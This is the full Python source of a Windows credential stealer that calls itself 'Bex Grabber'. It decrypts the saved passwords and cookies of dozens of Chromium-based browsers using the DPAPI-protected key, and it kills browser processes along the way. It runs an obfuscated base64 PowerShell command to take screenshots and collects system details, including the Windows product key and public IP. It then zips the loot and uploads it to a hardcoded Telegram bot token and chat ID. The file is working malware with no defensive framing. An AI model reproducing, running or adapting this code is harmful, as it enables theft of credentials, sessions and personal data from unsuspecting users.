import base64
import os
import subprocess
import json
import random
import shutil
import sqlite3
import time
import ctypes
from datetime import datetime
import requests
import winreg
from Crypto.Cipher import AES
from threading import Thread
from ctypes import wintypes
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()


APPDATA:str = os.getenv("APPDATA")
LOCALAPPDATA:str = os.getenv("LOCALAPPDATA")
TAPI: str = "7201454232:AAEPcn2bfld2FW8X8cEakCKx32kJdygixuI"
TCHATID: str = "7416297295"

class ChoriumBrowsers:
    
    encryptionKey: bytes = None
    BrowserPath: str = None
    LoginFilePaths: str = None
    savePath: str = None
    oldPath: str = None
    def __init__(self, browserPath: str) -> bool:
       
        if("Opera" in browserPath):
            self.oldPath = browserPath
            browserPath = os.path.join(APPDATA, browserPath)
        else:
            self.oldPath = browserPath
            browserPath = os.path.join(LOCALAPPDATA, browserPath)
        
        self.BrowserPath = browserPath
        self.encryptionKey = self.GetEncryptionKey()
        
    @staticmethod 
    def Check(browserPath: str) -> bool:
        if("Opera" in browserPath):
            browserPath = os.path.join(APPDATA, browserPath)
        else:
            browserPath = os.path.join(LOCALAPPDATA, browserPath)
        if not os.path.exists(path=browserPath):
            return False
        return True
    def GetEncryptionKey(self) -> bytes:
        if self.encryptionKey is not None:
                return self.EncryptionKey
            
        else:
            localStatePath = os.path.join(self.BrowserPath, "Local State")
            if os.path.isfile(localStatePath):
                for i in ["chrome", "brave", "opera", "edge", "comodo", "epic", "iridium", "opera"]:
                    Utility.TaskKill(i)
                with open(localStatePath, encoding= "utf-8", errors= "ignore") as file:
                    jsonContent: dict = json.load(file)

                    encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]

                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                    return self.EncryptionKey

            else:
                return None    
    
    def GetLoginPaths(self,browserPath: str):
        loginFilePaths = list()
        for root, _, files in os.walk(browserPath):
            for file in files:
                if file.lower() == "login data":
                    filepath = os.path.join(root, file)
                    loginFilePaths.append(filepath)
        return loginFilePaths
    #name = [Google_Chrome]Profile1_Password.txt
    def GetPasswords(self, savePath: str):
        browserName = self.oldPath.split("\\")[0] + "_" + self.oldPath.split("\\")[1]
        for path in self.GetLoginPaths(self.BrowserPath):
            name = f"[{browserName}]"
            if "Default" in path:
                name += "Default_Password.txt"
            else:
                a: list = path.split("\\") 
                name += a[len(a)-2] + "_Password.txt"
           
            while True:
                tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".db")
                if not os.path.isfile(tempfile):
                    break
            try:
                for i in ["chrome", "brave", "opera", "edge", "comodo", "epic", "iridium", "opera"]:
                    Utility.TaskKill(i)
                shutil.copy(path, tempfile)
            except Exception:
                continue
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b : b.decode(errors= "ignore")
            cursor = db.cursor()
            f = None
            try:
                results = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
                
                f = open(savePath+ name, mode="a+", encoding="utf8")    
                for url, username, password in results:
                    password = self.Decrypt(password, self.encryptionKey)                       
                    f.write(f"URL: {str(url)}\nUsername: {str(username)}\nPassword: {str(password)}\n")
                    Counter.PasswordCount +=1
                f.close()        
                if(os.path.getsize(savePath + name) <= 0):
                    os.remove(savePath+name)
            except Exception as e:
                print(e)
        print("dang setup tool")
    def Decrypt(self, buffer: bytes, key: bytes):
            version = buffer.decode(errors="ignore")
            if(version.startswith(("v10", "v11"))):
                iv = buffer[3:15]
                cipherText = buffer[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(cipherText)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
            else:
                return str(Syscalls.CryptUnprotectData(buffer))
    #======================== COOKIES =================================
    def GetCookiesPath(self, browserPath: str):
        
        cookiesFilePaths = list()

        for root, _, files in os.walk(self.BrowserPath):
            for file in files:
                if file.lower() == "cookies":
                    filepath = os.path.join(root, file)
                    cookiesFilePaths.append(filepath)
        return cookiesFilePaths
    def GetCookies(self, savePath: str):
        browserName = self.oldPath.split("\\")[0] + "_" + self.oldPath.split("\\")[1]
        for path in self.GetCookiesPath(self.BrowserPath):
            name = f"[{browserName}]"
            if "Default" in path:
                name += "Default_Cookies.txt"
            else:
                a = path.split("\\")
                name += a[len(a)-3] + "_Cookies.txt"
            while True:
                tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                if not os.path.isfile(tempfile):
                    break    
            try:
                for i in ["chrome", "brave", "opera", "edge", "comodo", "epic", "iridium", "opera"]:
                    Utility.TaskKill(i)
                shutil.copy(path, tempfile)
            except:
                continue
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b : b.decode(errors= "ignore")
            cursor = db.cursor()
            
            try:
                results = cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall()
                f = open(savePath + name, "a+", encoding="utf8")
                for host, name, path, cookie, expiry in results:
                    cookie = self.Decrypt(cookie, self.encryptionKey)
                    flag1 = "FALSE" if expiry == 0 else "TRUE"
                    flag2 = "FALSE" if str(host).startswith(".") else "TRUE"
                    if host and name and cookie:
                        
                        f.write(f"{host}\t{flag1}\t{path}\t{flag2}\t{expiry}\t{name}\t{cookie}\n")
                        Counter.CookiesCount += 1
                f.close()
                if(os.path.getsize(savePath + name) <= 0):
                    os.remove(savePath+name)        

            except Exception:
                pass
        print("xin chao, cho mot lát ")
class Counter:
    CookiesCount: int = 0
    PasswordCount: int = 0
    FilesCount: int = 0
    WalletsCount: int = 0
    TelegramSessionsCount: int = 0
class Utility:
    @staticmethod
    def GetRandomString(length: int = 5, invisible: bool = False): # Generates a random string
        if invisible:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= length))
        else:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))
    @staticmethod
    def TaskKill(*tasks: str) -> None: # Tries to kill given processes
        tasks = list(map(lambda x: x.lower(), tasks))
        
        out = (subprocess.run('tasklist /FO LIST', shell= True, capture_output= True).stdout.decode(errors= 'ignore')).strip().split('\r\n\r\n')
        
        for i in out:
            i = i.split("\r\n")[:2]
            try:
                name, pid = i[0].split()[-1], int(i[1].split()[-1])
                name = name [:-4] if name.endswith(".exe") else name
                for task in tasks:

                    if task in name.lower():
                        subprocess.run('taskkill /F /PID %d' % pid, shell= True, capture_output= True)
            except Exception:
                pass
    @staticmethod 
    def GetInkTarget(path_ink: str):
        target = None
        if os.path.isfile(path_ink):
            output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_ink).replace("\\", "\\\\"), shell= True, capture_output= True).stdout.decode()
            if output:
                for line in output.splitlines():
                    if line.startswith("Target="):
                        temp = line.lstrip("Target=").strip()
                        if os.path.exists(temp):
                            target = temp
                            break
        return target
    @staticmethod 
    def GetLnkFromStartMenu(app: str):
        shortcutPaths = []
        startMenuPaths = [
            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs"),
            os.path.join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs")
        ]
        for startMenuPath in startMenuPaths:
            for root, _, files in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == "%s.lnk" % app.lower():
                        shortcutPaths.append(os.path.join(root, file))
        
        return shortcutPaths
class Syscalls:
    @staticmethod 
    def CreateMutex(mutex: str) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)
        return kernel32.GetLastError() != 183
    @staticmethod 
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes:
        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)

        raise ValueError("Invalid encrypted_data provided!")
class Paths:
    browserPaths = [
        os.path.join("Google","Chrome","User Data"),
        os.path.join("Chromium","User Data"),
        os.path.join("Thorium","User Data"),
        os.path.join("Google(x86)","Chrome","User Data"),
        os.path.join("Google","Chrome SxS","User Data"),
        os.path.join("MapleStudio","ChromePlus","User Data"),
        os.path.join("Iridium","User Data"),
        os.path.join("7Star","7Star","User Data"),
        os.path.join("CentBrowser","User Data"),
	os.path.join("Chedot","User Data"),
	os.path.join("Vivaldi","User Data"),
	os.path.join("Kometa","User Data"),
	os.path.join("Elements Browser","User Data"),
	os.path.join("CryptoTab Browser","User Data"),
	os.path.join("Epic Privacy Browser","User Data"),
	os.path.join("uCozMedia","Uran","User Data"),
	os.path.join("Fenrir Inc","Sleipnir5","setting","modules","ChromiumViewer"),
	os.path.join("CatalinaGroup","Citrio","User Data"),
	os.path.join("Coowon","Coowon","User Data"),
	os.path.join("Liebao","User Data"),
        os.path.join("QIP Surf","User Data"),
        os.path.join("Orbitum","User Data"),
	os.path.join("Comodo","Dragon","User Data"),
	os.path.join("Maxthon3","User Data"),
	os.path.join("K-Melon","User Data"),
	os.path.join("Amigo","User Data"),
	os.path.join("Torch","User Data"),
	os.path.join("Sputnik","User Data"),
	os.path.join("DCBrowser","User Data"),
	os.path.join("UR Browser","User Data"),
	os.path.join("Slimjet","User Data"),
	os.path.join("Opera Software","Opera Stable"),
        os.path.join("Opera Software","Opera GX Stable"),
        os.path.join("BraveSoftware","Brave-Browser","User Data"),
        os.path.join("Yandex","YandexBrowser","User Data"),
        os.path.join("Microsoft","Edge","User Data"),
        os.path.join("360Browser","Browser","User Data"),
        os.path.join("CocCoc","Browser","User Data") 
    ]   
    isRun = False
    @staticmethod 
    def kill():
        
        while Paths.isRun:
            for i in ["chrome", "brave", "opera", "edge"]:
                Utility.TaskKill(i)
            time.sleep(0.2)
def Steal(savePath: str):
    os.chdir(savePath)
    command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
    if subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= savePath + "\\").returncode == 0:
        #print(1)
        pass
    
    saveBrowserCookies = savePath +"\\Browsers Data\\Cookies\\"
    saveBrowserPasswords = savePath + "\\Browsers Data\\Passwords\\"
    os.makedirs(saveBrowserCookies, exist_ok=True)
    os.makedirs(saveBrowserPasswords, exist_ok= True)
    threads = []
    for path in Paths.browserPaths: 
        if(ChoriumBrowsers.Check(path) == False):
            continue
        instace = ChoriumBrowsers(browserPath= path)
        instace.GetCookies(saveBrowserCookies )
        instace.GetPasswords(saveBrowserPasswords)
     
       
    saveSystemInfo = savePath + "\\SystemInfomation.txt"
    computerName = os.getenv("computername") or "Unable to get computer name"
    computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()
    computerOS = computerOS[2].strip() if len(computerOS) >= 2 else "Unable to detect OS"
    totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
    totalMemory = (str(int(int(totalMemory[1])/1000000000)) + " GB") if len(totalMemory) >= 1 else "Unable to detect total memory"
    uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
    uuid = uuid[1].strip() if len(uuid) >= 1 else "Unable to detect UUID"
    cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to detect CPU"
    gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()
    gpu = gpu[2].strip() if len(gpu) >= 2 else "Unable to detect GPU"
    productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to get product key"
    info ="============================================================\n"
    info+="###################### Bex Grabber  #############################\n"
    info+=f"Name: {str(computerName)}\n"
    info+=f"OS: {str(computerOS)}\n"
    info+=f"CPU: {str(cpu)}\n"
    info+=f"GPU: {str(gpu)}\n"
    info+=f"RAM: {str(totalMemory)}\n"
    info+=f"UUID: {str(uuid)}\n"
    info+=f"Product Key: {str(productKey)}\n"
    info+="============================================================\n"
    with open (saveSystemInfo, "w") as f:
        f.write(info)
        f.close()
    InfoLog.FileName = computerName
    InfoLog.IP = requests.get("https://api.ipify.org?format=json").json()["ip"]
    j = requests.get("https://ipinfo.io/json").json()
    InfoLog.Country = j["region"] + " " +j["country"]
    InfoLog.Date = datetime.today().strftime("%d-%m-%Y %H:%M:%S")
    for t in threads:
        t.join()
class InfoLog:
    FileName: str
    IP: str
    Country: str
    Date: str
    
    
if __name__ == "__main__" and os.name == "nt":
    
    TempPath = ""
    
    while True:
        TempPath = os.path.join(os.getenv("temp"), Utility.GetRandomString(10))
        if not os.path.isdir(TempPath):
            break
    #print(TempPath)
    Paths.isRun = True
    os.makedirs(TempPath)
    # Steal(TempPath)
    
    # InfoLog.StealFile(TempPath)
    t1 = Thread(target=Steal, args={TempPath,})
    #t2 =  Thread(target=InfoLog.StealFile, args={TempPath,})
    t1.start()
    #t2.start()
    t1.join()
    #t2.join()
    zipf = TempPath
    shutil.make_archive(zipf, "zip", TempPath)
    zipf = zipf + ".zip"
    info = f"""<b>====== Bex Grabber Logs =======</b>
<b>==== PC Infomation ====</b>
Name: {InfoLog.FileName} 
IP: {InfoLog.IP} 
Country: {InfoLog.Country}
Date: {InfoLog.Date}
<b>==== Browser Data ====</b>
Cookies: {Counter.CookiesCount}
Passwords: {Counter.PasswordCount}
<b>==== Wallets ====</b>
"""
    filename = f"{InfoLog.Country}-{InfoLog.IP}-{InfoLog.Date}"
    files = {'document': (filename +".zip", open(zipf, 'rb'), 'text/plain')}
    data = {'chat_id': TCHATID, 'caption': info , 'parse_mode': 'HTML'}

    url = f'https://api.telegram.org/bot{TAPI}/sendDocument'

    response = requests.post(url=url, files=files, data= data)
    if(response.status_code == 200):
        print("Done")
        #os.removedirs(TempPath)
        #os.remove(zipf)
        exit(1)
    else:
        print(response.text)
        pass
